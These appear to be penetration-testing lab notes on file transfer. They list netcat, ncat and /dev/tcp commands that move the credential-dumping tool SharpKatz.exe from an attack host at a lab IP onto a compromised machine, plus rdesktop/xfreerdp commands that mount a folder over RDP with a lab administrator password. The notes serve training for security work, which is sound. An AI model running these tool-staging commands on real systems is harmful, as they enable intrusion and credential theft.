## File Transfer with Netcat and Ncat

NetCat - Compromised Machine - Listening on Port 8000
```shell-session
nc -l -p 8000 > SharpKatz.exe
```

Ncat - Compromised Machine - Listening on Port 8000
```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Netcat - Attack Host - Sending File to Compromised machine
```shell-session
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Ncat
```shell-session
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

Attack Host - Sending File as Input to Netcat
```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Compromised Machine Connect to Netcat to Receive the File
```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```

Attack Host - Sending File as Input to Ncat
```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Compromised Machine Connect to Ncat to Receive the File
```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

NetCat - Sending File as Input to Netcat
```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Ncat - Sending File as Input to Ncat
```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## RDP

#### Mounting a Linux Folder Using rdesktop
```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp
```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
